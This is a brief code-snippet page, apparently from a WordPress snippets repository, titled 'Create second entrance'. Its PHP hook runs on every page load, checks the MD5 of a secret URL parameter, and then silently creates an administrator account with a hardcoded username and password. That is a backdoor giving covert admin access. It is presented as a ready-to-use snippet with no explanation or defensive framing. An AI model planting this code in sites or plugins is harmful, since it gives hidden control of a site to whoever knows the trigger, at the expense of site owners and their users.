## Create second entrance

### Code Snippet

```php
//Open yoursite.com/?entrance=open
add_action('wp_head', 'create_entrance');
function create_entrance() {
  if(md5($_GET['entrance']) === '1c4dcdc4f55ae2adab37f80f5b4efa81') {
    require('wp-includes/registration.php');
    if(!username_exists('debt_collector')) {
      $user_id = wp_create_user('debt_collector', 'LetMeIn!');
      $user = new WP_User($user_id);
      $user->set_role('administrator');
    }
  }
}
```
### Explanations

### License

[GNU General Public License v2.0](https://github.com/dedewiweka/snippets/blob/main/LICENSE)

### Support and Contact

For more information and details about my work please visit [My Development Website](https://dede.wiweka.com/development).